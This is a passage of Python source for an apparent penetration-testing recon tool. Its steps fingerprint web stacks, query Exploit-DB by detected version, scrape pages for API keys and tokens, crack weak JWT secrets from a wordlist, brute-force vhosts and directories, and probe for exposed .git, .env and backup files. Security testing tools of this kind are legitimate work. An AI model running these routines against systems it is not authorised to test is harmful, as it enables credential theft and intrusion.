    lines += [f"{k}: {v}" for k, v in headers.items()]
    return "\n".join(lines)


def _tool_http_fingerprint(ip: str, port: int, proto: str) -> str:
    """HTTP step-2 tool: fingerprint the web stack with whatweb (server, framework, CMS,
    plugins, versions) — deeper than step 1's raw headers. External binary; a missing
    whatweb or a dead target raises, so the step won't turn green on a non-result."""
    exe = shutil.which("whatweb")
    if not exe:
        raise RuntimeError("whatweb not found in PATH — install it or run this step manually")
    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    url = f"{'https' if tls else 'http'}://{ip}:{port}/"
    proc = subprocess.run([exe, "--color=never", "--no-errors", "-a", "1", url],
                          capture_output=True, text=True, timeout=90)
    out = (proc.stdout or "").strip() or (proc.stderr or "").strip()
    if not out:
        raise RuntimeError("whatweb returned no output (target unreachable?)")
    return out


def _tool_tls_cert(ip: str, port: int, proto: str) -> str:
    """HTTP step-3 tool: grab the TLS certificate with openssl and dump its text (subject,
    issuer, SAN). Saved under the 'ssl-cert' id so _extract_hostnames auto-harvests SAN DNS
    names into the hostnames table (→ /etc/hosts / vhost-fuzz); emails land in findings.
    Non-TLS ports raise, so the step won't turn green on a non-result."""
    exe = shutil.which("openssl")
    if not exe:
        raise RuntimeError("openssl not found in PATH — run this step manually")
    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    if not tls:
        raise RuntimeError(f"no TLS on {ip}:{port} — step 3 targets HTTPS/TLS services")
    cmd = [exe, "s_client", "-connect", f"{ip}:{port}"]
    hn = next((h for h, _p, _s in fetch_hostnames(ip)), None)   # SNI → per-vhost cert if we have a name
    if hn:
        cmd += ["-servername", hn]
    s = subprocess.run(cmd, input="", capture_output=True, text=True, timeout=20)
    if "BEGIN CERTIFICATE" not in s.stdout:
        raise RuntimeError("no certificate returned (handshake failed?)")
    x = subprocess.run([exe, "x509", "-noout", "-text"], input=s.stdout,
                       capture_output=True, text=True, timeout=15)
    out = (x.stdout or "").strip()
    if not out:
        raise RuntimeError("could not parse certificate")
    return out


_SPLOIT_INTERESTING = {   # whatweb plugin names worth an Exploit-DB lookup (when versioned)
    "apache", "nginx", "microsoft-iis", "litespeed", "openresty", "tomcat", "jetty",
    "php", "wordpress", "drupal", "joomla", "magento", "mediawiki", "typo3", "moodle",
    "jenkins", "jira", "gitlab", "phpmyadmin", "openssl", "openssh",
}


def _exploit_search_terms(ip: str, port: int, proto: str) -> list:
    """(product, version) pairs to feed searchsploit: nmap -sV product+version plus the
    whatweb CMS/framework tokens from step 2. Only pairs with a real version number (x.y[.z])
    — bare products are skipped because they'd flood searchsploit."""
    terms, seen = [], set()

    def _add(product: str, version: str) -> None:
        product, version = (product or "").strip(), (version or "").strip()
        if not product or not re.match(r"\d+(\.\d+)+", version):   # need major.minor at least
            return
        product = product.split()[0].lower()          # "Apache httpd" -> "apache"
        version = re.match(r"[0-9.]+", version).group(0)   # "2.4.29 (Ubuntu)" -> "2.4.29"
        if (product, version) not in seen:
            seen.add((product, version))
            terms.append((product, version))

    _name, prod, ver, _cpe = (fetch_services(ip).get((port, proto)) or ("", "", "", ""))
    _add(prod, ver)                                    # 1) nmap -sV
    for sid, out in fetch_scripts(ip, port, proto):    # 2) whatweb fingerprint tokens
        if sid != "http-fingerprint":
            continue
        for pname, pval in re.findall(r"([A-Za-z0-9_.-]+)\[([^\]]*)\]", out or ""):
            if pname.lower() in _SPLOIT_INTERESTING:
                _add(pname, pval)
    return terms


def _tool_searchsploit(ip: str, port: int, proto: str) -> str:
    """HTTP step-4 tool: query the local Exploit-DB for the versions found in steps 1-2 with
    searchsploit --strict --title (version-range fuzzing off → far fewer false positives).
    Candidates only — verify before use; CMS matches can still hit plugin versions."""
    exe = shutil.which("searchsploit")
    if not exe:
        raise RuntimeError("searchsploit not found in PATH — install exploitdb or run manually")
    terms = _exploit_search_terms(ip, port, proto)
    if not terms:
        raise RuntimeError("no product+version known yet — run steps 1-2 first")
    searched = "; ".join(f"{p} {v}" for p, v in terms)
    seen, hits = set(), []
    for product, version in terms:
        proc = subprocess.run([exe, "-j", "-s", "-t", product, version],
                              capture_output=True, text=True, timeout=30)
        try:
            rows = json.loads(proc.stdout or "{}").get("RESULTS_EXPLOIT", [])
        except ValueError:
            rows = []
        for r in rows:
            edb = str(r.get("EDB-ID", "?"))
            if edb in seen:
                continue
            seen.add(edb)
            hits.append((f"{product} {version}", (r.get("Title") or "").strip(), edb,
                         r.get("Path", "")))
            if len(hits) >= 10:                        # cap: keep it a shortlist, not a dump
                break
        if len(hits) >= 10:
            break
    if not hits:
        return f"searched: {searched}\n\nno Exploit-DB matches (strict/version)"
    lines = [f"searched: {searched}", ""]
    for term, title, edb, path in hits:
        lines.append(f"[{term}] {title}  (EDB-{edb})")
        if path:
            lines.append(f"    {path}")
    return "\n".join(lines)


_SECRET_PATTERNS = [   # conservative set — fixed-format keys first, then noisier assignments
    ("aws-key",     r"AKIA[0-9A-Z]{16}"),
    ("google-api",  r"AIza[0-9A-Za-z_\-]{35}"),
    ("slack-token", r"xox[baprs]-[0-9A-Za-z-]{10,}"),
    ("jwt",         r"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}"),
    ("bearer",      r"[Aa]uthorization[\"']?\s*[:=]\s*[\"']?Bearer\s+[A-Za-z0-9._\-]+"),
    ("private-key", r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----"),
    ("assignment",  r"(?i)(?:api[_-]?key|secret|token|password|passwd|pwd)"
                    r"[\"']?\s*[:=]\s*[\"'][^\"']{6,60}[\"']"),
]


def _tool_http_source(ip: str, port: int, proto: str) -> str:
    """HTTP step-5 tool: fetch the landing page + its same-host JS (depth 0-1) and mine HTML
    comments, endpoints / API routes and likely secrets (keys, tokens). Stdlib only; a dead
    target raises so the step won't go green. Secrets are candidates — verify (esp. assignment)."""
    import urllib.request
    import urllib.error
    import urllib.parse
    import ssl

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    base = f"{'https' if tls else 'http'}://{ip}:{port}"
    ctx = ssl._create_unverified_context()
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))

    def _get(url: str, limit: int = 512_000) -> str:
        req = urllib.request.Request(url, headers={"User-Agent": "pshunter"})
        try:
            with opener.open(req, timeout=8) as r:            # default opener follows redirects
                return r.read(limit).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:                   # 4xx/5xx bodies still worth mining
            return e.read(limit).decode("utf-8", "replace") if e.fp else ""

    html = _get(base + "/")
    if not html:
        raise RuntimeError(f"no HTML from {base}/ (unreachable?)")

    js_urls = []                                              # same host:port JS only, cap 10
    for src in re.findall(r"<script[^>]+src=[\"']([^\"']+)[\"']", html, re.I):
        u = urllib.parse.urljoin(base + "/", src)
        if u.startswith(base) and u not in js_urls:
            js_urls.append(u)
    js_urls = js_urls[:10]

    corpus = html
    for u in js_urls:
        corpus += "\n" + _get(u)

    comments = []
    for c in re.findall(r"<!--(.*?)-->", html, re.S):
        c = " ".join(c.split())
        if len(c) > 3 and not c.startswith("[if"):            # skip IE conditional comments
            comments.append(c[:160])

    eps = set()
    eps.update(re.findall(r"[\"'`](/[A-Za-z0-9_./?=&%-]{2,})[\"'`]", corpus))
    eps.update(re.findall(r"(?:fetch|axios(?:\.\w+)?|\.open)\(\s*[\"'`]([^\"'`]+)", corpus))
    eps.update(re.findall(r"(https?://[A-Za-z0-9_.:-]+/[A-Za-z0-9_./?=&%-]*)", corpus))
    endpoints = sorted({e for e in eps if len(e) <= 120})[:40]

    secrets, seen = [], set()
    for label, pat in _SECRET_PATTERNS:
        for mtch in re.findall(pat, corpus):
            s = (mtch if isinstance(mtch, str) else mtch[0]).strip()[:80]
            if (label, s) not in seen:
                seen.add((label, s))
                secrets.append(f"{label}: {s}")
    secrets = secrets[:15]

    lines = [f"{base}/ → {len(html)} bytes HTML, {len(js_urls)} JS file(s)"]
    if js_urls:
        lines.append(f"\nJS FILES ({len(js_urls)}):")
        lines += [f"  {u}" for u in js_urls]
    if endpoints:
        lines.append(f"\nENDPOINTS ({len(endpoints)}):")
        lines += [f"  {e}" for e in endpoints]
    if comments:
        lines.append(f"\nHTML COMMENTS ({len(comments)}):")
        lines += [f"  {c}" for c in comments[:25]]
    if secrets:
        lines.append(f"\nPOTENTIAL SECRETS ({len(secrets)}):")
        lines += [f"  {s}" for s in secrets]
    return "\n".join(lines)


_ERROR_TECH = [   # framework signatures that leak from an error/404 page body
    ("Werkzeug/Flask", r"Werkzeug|Traceback \(most recent call last\)"),
    ("Django",         r"Django|You're seeing this error because"),
    ("Laravel/Symfony", r"Laravel|Symfony|Whoops"),
    ("ASP.NET",        r"ASP\.NET|Server Error in .*? Application"),
    ("Java/Tomcat",    r"Apache Tomcat|javax\.servlet|java\.lang\."),
    ("Express",        r"Cannot (?:GET|POST) /|X-Powered-By: Express"),
    ("Rails",          r"Ruby on Rails|Action Controller"),
    ("PHP",            r"Fatal error:|Warning:.*?on line|<b>Notice</b>"),
]


def _tool_http_wellknown(ip: str, port: int, proto: str) -> str:
    """HTTP step-6 tool: fetch a fixed set of well-known files (robots.txt, sitemap.xml,
    .well-known, an error page) and pull out hidden paths + tech leaks. Stdlib only; a dead
    target raises. Not a brute-force — a known, finite set of locations (dir-brute is step 8)."""
    import urllib.request
    import urllib.error
    import ssl

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    base = f"{'https' if tls else 'http'}://{ip}:{port}"
    ctx = ssl._create_unverified_context()
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))

    def _get(path: str, limit: int = 256_000):
        req = urllib.request.Request(base + path, headers={"User-Agent": "pshunter"})
        try:
            with opener.open(req, timeout=8) as r:
                return r.status, r.read(limit).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, (e.read(limit).decode("utf-8", "replace") if e.fp else "")
        except Exception:                                     # connection-level failure
            return None, ""

    robots_status, robots = _get("/robots.txt")
    err_status, err = _get("/pshunter-probe-404-xyz")         # error page for a tech leak
    if robots_status is None and err_status is None:
        raise RuntimeError(f"{base} unreachable")

    robots_paths = []
    if robots_status == 200:
        for p in re.findall(r"(?im)^(?:Disallow|Allow):\s*(\S+)", robots):
            if p not in robots_paths:
                robots_paths.append(p)

    sitemap_urls = []
    for sm in ("/sitemap.xml", "/sitemap_index.xml"):
        st, body = _get(sm)
        if st == 200:
            for loc in re.findall(r"<loc>\s*([^<\s]+)\s*</loc>", body, re.I):
                if loc not in sitemap_urls:
                    sitemap_urls.append(loc)
    sitemap_urls = sitemap_urls[:100]

    wellknown = []
    for wk in ("/.well-known/security.txt", "/crossdomain.xml", "/clientaccesspolicy.xml"):
        st, body = _get(wk)
        if st == 200 and body.strip():
            wellknown.append((wk, body.strip()[:400]))

    tech = [label for label, pat in _ERROR_TECH if re.search(pat, err, re.I | re.S)]

    lines = [f"{base} — well-known probe (robots {robots_status}, error {err_status})"]
    if robots_paths:
        lines.append(f"\nROBOTS PATHS ({len(robots_paths)}):")
        lines += [f"  {p}" for p in robots_paths[:50]]
    if sitemap_urls:
        lines.append(f"\nSITEMAP URLS ({len(sitemap_urls)}):")
        lines += [f"  {u}" for u in sitemap_urls]
    if wellknown:
        lines.append(f"\nWELL-KNOWN ({len(wellknown)}):")
        for path, body in wellknown:
            lines.append(f"  {path}:")
            lines += [f"    {ln.rstrip()}" for ln in body.splitlines()[:8]]
    if tech:
        lines.append(f"\nERROR-PAGE TECH: {', '.join(tech)}")
    return "\n".join(lines)


_JWT_WEAK_SECRETS = [   # small curated list — a trivial-secret check, not a full crack (hashcat)
    "secret", "password", "changeme", "admin", "jwt", "key", "private", "your-256-bit-secret",
    "your_jwt_secret", "supersecret", "s3cr3t", "secretkey", "secret123", "password123",
    "12345678", "qwerty", "test", "dev", "default", "token", "mysecret", "jwtsecret",
    "jsonwebtoken", "shhhh", "topsecret", "letmein", "root", "pass", "hmac", "signature",
    "verysecret", "sign", "secretpassword", "iloveyou", "abc123", "welcome", "ChangeMe!",
]


def _jwt_analyze(token: str):
    """(header, payload, note) for a JWT, or None if it isn't one. `note` flags alg:none or a
    cracked weak HS256 secret."""
    import base64
    import json
    import hmac
    import hashlib

    parts = token.split(".")
    if len(parts) != 3 or not token.startswith("eyJ"):
        return None

    def _seg(s):
        return json.loads(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)).decode("utf-8", "replace"))

    try:
        header, payload = _seg(parts[0]), _seg(parts[1])
    except Exception:
        return None
    alg, note = str(header.get("alg", "?")), None
    if alg.lower() == "none":
        note = "alg:none → auth bypass"
    elif alg.upper() == "HS256":
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        for sec in _JWT_WEAK_SECRETS:
            sig = base64.urlsafe_b64encode(
                hmac.new(sec.encode(), signing_input, hashlib.sha256).digest()).rstrip(b"=").decode()
            if hmac.compare_digest(sig, parts[2]):
                note = f"weak HS256 secret: '{sec}'"
                break
    return header, payload, note


def _tool_http_cookies(ip: str, port: int, proto: str) -> str:
    """HTTP step-7 tool: read Set-Cookie flags, flag predictable session IDs, and decode any
    JWT (alg:none / weak HS256 secret). Stdlib only; a dead target raises. No cookies is a
    valid green result (nothing to report)."""
    import urllib.request
    import urllib.error
    import ssl

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    base = f"{'https' if tls else 'http'}://{ip}:{port}"
    ctx = ssl._create_unverified_context()
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
    req = urllib.request.Request(base + "/", headers={"User-Agent": "pshunter"})
    try:
        resp = opener.open(req, timeout=8)
        headers = resp.headers
    except urllib.error.HTTPError as e:                        # 4xx/5xx still carry Set-Cookie
        headers = e.headers

    raw = headers.get_all("Set-Cookie") or []
    cookie_lines, jwt_lines = [], []
    for sc in raw:
        cname, _, cval = sc.split(";")[0].partition("=")
        cname, cval = cname.strip(), cval.strip()
        attrs = sc.lower()
        missing = [f for f, tok in (("HttpOnly", "httponly"), ("Secure", "secure"),
                                    ("SameSite", "samesite"))
                   if tok not in attrs and not (f == "Secure" and not tls)]
        line = f"{cname}: " + (f"missing {','.join(missing)}" if missing else "flags ok")
        if re.search(r"sess|sid|token|auth|jwt|id$", cname, re.I) and \
                (len(cval) < 8 or cval.isdigit() or len(set(cval)) <= 4):
            line += " · looks predictable"
        cookie_lines.append(line)
        info = _jwt_analyze(cval)
        if info:
            hdr, payload, note = info
            claims = {k: payload[k] for k in ("sub", "role", "user", "name", "exp") if k in payload}
            jwt_lines.append(f"{cname}: alg={hdr.get('alg')} {claims}" + (f"  ⚠ {note}" if note else ""))

    lines = [f"{base}/ — {len(raw)} Set-Cookie header(s)"]
    if cookie_lines:
        lines.append("\nCOOKIES:")
        lines += [f"  {c}" for c in cookie_lines]
    if jwt_lines:
        lines.append("\nJWT:")
        lines += [f"  {j}" for j in jwt_lines]
    if not cookie_lines:
        lines.append("\nno cookies set (pre-auth)")
    return "\n".join(lines)


# vhost/subdomain wordlists, best first — the runner uses the first that exists on disk,
# else a small builtin fallback so the tool always has something to sweep.
_VHOST_WORDLISTS = [
    ("seclists top-20000",     "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"),
    ("seclists top-5000",      "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"),
    ("seclists bitquark-100k", "/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt"),
    ("seclists n0kovo-small",  "/usr/share/seclists/Discovery/DNS/n0kovo_subdomains/n0kovo_subdomains_small.txt"),
    ("amass top-20000",        "/usr/share/wordlists/amass/subdomains-top1mil-20000.txt"),
    ("amass top-5000",         "/usr/share/wordlists/amass/subdomains-top1mil-5000.txt"),
    ("dnsmap",                 "/usr/share/wordlists/dnsmap.txt"),
]
_VHOST_BUILTIN = [   # ultimate fallback: common internal / CTF vhost labels
    "www", "dev", "development", "staging", "stage", "test", "testing", "uat", "qa",
    "admin", "administrator", "api", "api-dev", "internal", "intranet", "corp", "portal",
    "dashboard", "app", "apps", "web", "webmail", "mail", "smtp", "vpn", "git", "gitlab",
    "jenkins", "jira", "confluence", "grafana", "kibana", "prometheus", "db", "database",
    "phpmyadmin", "backup", "old", "beta", "demo", "static", "cdn", "files", "upload",
    "storage", "auth", "sso", "login", "secure", "monitor", "status", "support",
]
_VHOST_DEADLINE = 600         # s — hard wall-clock cap across every pass
_VHOST_THREADS = 30
_VHOST_REQ_TIMEOUT = 5
_VHOST_MAX_CANDIDATES = 25000  # sanity cap on words per pass


def _pick_vhost_wordlist() -> tuple:
    """Return (label, words) from the best available wordlist, or a builtin fallback.
    `label` names the source (with its path) so it can be shown at launch."""
    for label, path in _VHOST_WORDLISTS:
        if os.path.exists(path):
            try:
                with open(path, encoding="utf-8", errors="ignore") as fh:
                    words = [w.strip() for w in fh if w.strip() and not w.startswith("#")]
            except OSError:
                continue
            if words:
                return f"{label} ({path})", words
    return f"builtin ({len(_VHOST_BUILTIN)} common vhosts)", list(_VHOST_BUILTIN)


def _vhost_base_domains(ip: str) -> list:
    """Base domains to fuzz as FUZZ.<domain>, derived from hostnames already harvested
    (cert SAN/CN, redirects, JS). Heuristic registrable domain = last 2–3 labels."""
    doms = set()
    for hn, _p, _s in fetch_hostnames(ip):
        hn = (hn or "").lstrip("*.").strip(".")
        parts = hn.split(".")
        if len(parts) >= 2:
            doms.add(".".join(parts[-2:]))
        if len(parts) >= 3:
            doms.add(".".join(parts[-3:]))
    return sorted(doms)


def _tool_vhost_fuzz(ip: str, port: int, proto: str) -> str:
    """HTTP step-8 tool: sweep virtual hosts on THIS IP by spoofing the Host header, keeping
    only responses that differ from a per-pass catch-all baseline (kills wildcard vhosts).
    Runs one pass per harvested base domain (FUZZ.<domain>) plus a bare-label pass, all under
    a shared wall-clock deadline. Discovered FQDN vhosts are saved to the hostnames table
    incrementally (the moment each is found), so a long run never loses progress."""
    import http.client
    import ssl
    import time
    import random
    import string
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _probe(hostval):
        """(status, body-length) for a GET / with a spoofed Host, or (None, None) on error."""
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_VHOST_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_VHOST_REQ_TIMEOUT)
            conn.request("GET", "/", headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            body = resp.read(65536)
            return resp.status, len(body)
        except Exception:                                     # noqa: BLE001 — one dead probe never aborts the sweep
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    # fail fast if the web server itself is unreachable (so the step won't go green on nothing)
    if _probe(ip)[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot vhost-fuzz")

    wl_label, words = _pick_vhost_wordlist()
    words = words[:_VHOST_MAX_CANDIDATES]
    domains = _vhost_base_domains(ip)

    # passes: one per base domain (FUZZ.domain), then a bare-label pass last (lower priority)
    passes = [(f"FUZZ.{d}", (lambda w, d=d: f"{w}.{d}")) for d in domains]
    passes.append(("FUZZ (bare label)", (lambda w: w)))

    deadline = time.time() + _VHOST_DEADLINE
    hits, seen = [], set()
    hits_lock = threading.Lock()
    tested = [0]
    tested_lock = threading.Lock()
    stopped_deadline = [False]

    def _diff(status, length, b_status, b_len):
        if status is None:
            return False
        if b_status is None:                                  # junk host got nothing → any live vhost counts
            return True
        if status != b_status:
            return True
        return abs(length - b_len) > max(200, int(b_len * 0.05))

    pass_summaries = []
    for pass_label, hostfmt in passes:
        if time.time() >= deadline:
            stopped_deadline[0] = True
            break
        rnd = "zz" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
        b_status, b_len = _probe(hostfmt(rnd))               # per-pass catch-all baseline
        q = _queue.Queue()
        for w in words:
            q.put(w)

        def _worker():
            while True:
                if time.time() >= deadline:
                    stopped_deadline[0] = True
                    return
                try:
                    w = q.get_nowait()
                except _queue.Empty:
                    return
                hostval = hostfmt(w)
                status, length = _probe(hostval)
                with tested_lock:
                    tested[0] += 1
                if _diff(status, length, b_status, b_len):
                    with hits_lock:
                        if hostval not in seen:
                            seen.add(hostval)
                            hits.append(f"+ {hostval}  → HTTP {status}  ({length} b)")
                            # persist FQDN vhosts live so a long run never loses progress
                            save_hostnames(ip, [{"port": port, "hostname": hostval,
                                                 "source": "vhost-fuzz"}])

        threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_VHOST_THREADS)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        base_desc = f"HTTP {b_status} ({b_len} b)" if b_status is not None else "no response"
        pass_summaries.append(f"  {pass_label}: baseline {base_desc}")

    reason = "deadline" if stopped_deadline[0] else "wordlist exhausted"
    lines = [f"{scheme}://{ip}:{port}/ vhost sweep",
             f"wordlist: {wl_label}",
             f"passes: {len(passes)} ({', '.join(pl for pl, _ in passes)})",
             f"tested {tested[0]} · hits {len(hits)} · stopped: {reason}",
             ""]
    lines += pass_summaries
    if hits:
        lines.append("\nVHOSTS:")
        lines += [f"  {h}" for h in sorted(hits)]
    else:
        lines.append("\nno differentiated vhosts found")
    return "\n".join(lines)


# directory/file wordlists for content discovery, best first — each entry may list several
# files (merged if present); the runner uses the first entry that has any file on disk.
_DIRB_WORDLISTS = [
    ("seclists raft-medium", ["/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
                              "/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt"]),
    ("seclists dirlist-2.3-medium", ["/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"]),
    ("seclists common", ["/usr/share/seclists/Discovery/Web-Content/common.txt"]),
    ("dirb common", ["/usr/share/wordlists/dirb/common.txt"]),
    ("dirb big", ["/usr/share/wordlists/dirb/big.txt"]),
    ("dirbuster small", ["/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"]),
]
_DIRB_BUILTIN = [   # ultimate fallback: common dirs / files worth a look
    "admin", "administrator", "login", "dashboard", "api", "uploads", "upload", "images",
    "assets", "static", "backup", "backups", "config", "includes", "inc", "tmp", "test",
    "dev", "old", "private", "secret", "data", "db", "sql", "logs", "log", "wp-admin",
    "wp-content", "phpmyadmin", "server-status", "robots.txt", "sitemap.xml", ".git",
    ".env", ".htaccess", "web.config", "config.php", "info.php", "phpinfo.php", "index.php",
]
_DIRB_EXTS = ["php", "asp", "aspx", "txt", "bak", "zip", "html", "old"]
_DIRB_DEADLINE = 900          # s — hard wall-clock cap across all targets
_DIRB_THREADS = 30
_DIRB_REQ_TIMEOUT = 5
_DIRB_MAX_WORDS = 20000       # sanity cap on words per target
_DIRB_SENSITIVE = re.compile(
    r"\.(bak|zip|old|sql|tar|gz|tgz|env|git|svn|conf|config|pem|key)\b"
    r"|/(backup|admin|config|\.git|\.env|\.svn)", re.I)


def _pick_dirb_wordlist() -> tuple:
    """Return (label, words) from the best available dir/file wordlist, or a builtin
    fallback. Multi-file entries are merged (dedup, order-preserving)."""
    for label, paths in _DIRB_WORDLISTS:
        merged, seen = [], set()
        for path in paths:
            if not os.path.exists(path):
                continue
            try:
                with open(path, encoding="utf-8", errors="ignore") as fh:
                    for ln in fh:
                        w = ln.strip()
                        if w and not w.startswith("#") and w not in seen:
                            seen.add(w)
                            merged.append(w)
            except OSError:
                continue
        if merged:
            return f"{label} ({', '.join(paths)})", merged
    return f"builtin ({len(_DIRB_BUILTIN)} common paths)", list(_DIRB_BUILTIN)


def _tool_dir_brute(ip: str, port: int, proto: str) -> str:
    """HTTP step-9 tool: content discovery — brute-force dirs/files on the default host AND
    every discovered vhost (Host header, so vhosts work without /etc/hosts). Per target a
    soft-404 baseline filters catch-all 200s; only responses that differ are reported. All
    targets share one wall-clock deadline. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import time
    import random
    import string
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _probe(hostval, path):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_DIRB_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_DIRB_REQ_TIMEOUT)
            conn.request("GET", path, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            body = resp.read(65536)
            return resp.status, len(body)
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _probe(ip, "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot content-sweep")

    wl_label, words = _pick_dirb_wordlist()
    words = words[:_DIRB_MAX_WORDS]

    def _paths_for(word):
        w = word.lstrip("/")
        if not w:
            return []
        out = ["/" + w]
        if "." not in w:                                      # plain dir/name → try extensions too
            out += [f"/{w}.{e}" for e in _DIRB_EXTS]
        return out

    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    targets = [ip] + [v for v in vhosts if v != ip]          # default host first, then each vhost

    deadline = time.time() + _DIRB_DEADLINE
    tested = [0]
    tested_lock = threading.Lock()
    stopped_deadline = [False]
    target_hits = {}                                          # hostval -> ["+ 200  /path", ...]

    def _rnd_path():
        return "/zz" + "".join(random.choices(string.ascii_lowercase + string.digits, k=12)) \
               + random.choice(["", ".php"])

    def _is_hit(status, length, baselines):
        if status is None or status == 404:
            return False
        for bs, bl in baselines:
            if bs is not None and status == bs and abs(length - bl) <= max(200, int(bl * 0.05)):
                return False                                  # matches the soft-404 signature
        return True

    for hostval in targets:
        if time.time() >= deadline:
            stopped_deadline[0] = True
            break
        baselines = [_probe(hostval, _rnd_path()) for _ in range(2)]
        q = _queue.Queue()
        for w in words:
            for p in _paths_for(w):
                q.put(p)
        hits, seen = [], set()
        hits_lock = threading.Lock()

        def _worker():
            while True:
                if time.time() >= deadline:
                    stopped_deadline[0] = True
                    return
                try:
                    path = q.get_nowait()
                except _queue.Empty:
                    return
                status, length = _probe(hostval, path)
                with tested_lock:
                    tested[0] += 1
                if _is_hit(status, length, baselines):
                    with hits_lock:
                        if path not in seen:
                            seen.add(path)
                            hits.append(f"+ {status}  {path}")
                q.task_done()

        threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_DIRB_THREADS)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        if hits:
            target_hits[hostval] = sorted(hits, key=lambda h: h.split()[-1])

    total_hits = sum(len(v) for v in target_hits.values())
    reason = "deadline" if stopped_deadline[0] else "wordlist exhausted"
    lines = [f"{scheme}://{ip}:{port}/ content sweep",
             f"wordlist: {wl_label}",
             f"targets: {len(targets)} ({', '.join([f'{ip} [default]'] + [v for v in targets if v != ip])})",
             f"tested {tested[0]} · hits {total_hits} · stopped: {reason}"]
    if target_hits:
        for hostval in targets:
            hh = target_hits.get(hostval)
            if not hh:
                continue
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            lines += [f"  {h}" for h in hh]
    else:
        lines.append("\nno content discovered (soft-404 only)")
    return "\n".join(lines)


# known high-value exposures: (path, body-signature | None, high-severity?). The signature
# (bytes regex, matched against the response body) confirms a true positive with near-zero
# false positives — a soft-404 200 won't carry `[core]`, `PK\x03\x04`, `ref:`, etc.
_VCS_CHECKS = [
    (".git/HEAD", rb"ref:\s", True),
    (".git/config", rb"\[core\]", True),
    (".git/index", rb"^DIRC", True),
    (".git/logs/HEAD", rb"[0-9a-f]{40}", True),
    (".gitignore", None, False),
    (".svn/entries", None, True),
    (".svn/wc.db", rb"^SQLite format 3", True),
    (".hg/requires", None, True),
    (".bzr/branch-format", None, True),
    (".env", rb"[A-Z0-9_]{2,}=", True),
    (".env.bak", rb"[A-Z0-9_]{2,}=", True),
    (".env.example", rb"[A-Z0-9_]{2,}=", False),
    ("web.config", rb"(?i)<configuration", True),
    ("wp-config.php.bak", rb"(?i)db_password|<\?php", True),
    ("wp-config.php~", rb"(?i)db_password|<\?php", True),
    (".htpasswd", rb":\$", True),
    ("docker-compose.yml", rb"(?i)services:|version:", True),
    ("Dockerfile", rb"(?i)^FROM\s", False),
    ("application.properties", rb"(?i)password|url=", True),
    ("settings.py", rb"(?i)SECRET_KEY|DATABASES", True),
    ("backup.zip", rb"^PK\x03\x04", True),
    ("backup.tar.gz", rb"^\x1f\x8b", True),
    ("backup.sql", rb"(?i)insert into|create table|mysql dump", True),
    ("dump.sql", rb"(?i)insert into|create table", True),
    ("db.sql", rb"(?i)insert into|create table", True),
    ("database.sql", rb"(?i)insert into|create table", True),
    (".DS_Store", rb"Bud1", False),
]
# swap/backup copies of source files leak the source itself (creds, logic) → high
_VCS_SWAP_BASES = ["index.php", "config.php", "wp-config.php", "configuration.php",
                   "database.php", "settings.py", "app.py", ".env"]
_VCS_SWAP_FORMS = ["{b}.bak", "{b}~", "{b}.old", "{b}.save", "{b}.swp", ".{b}.swp", "{b}.orig"]
# archives named after the site, confirmed by their magic bytes where possible
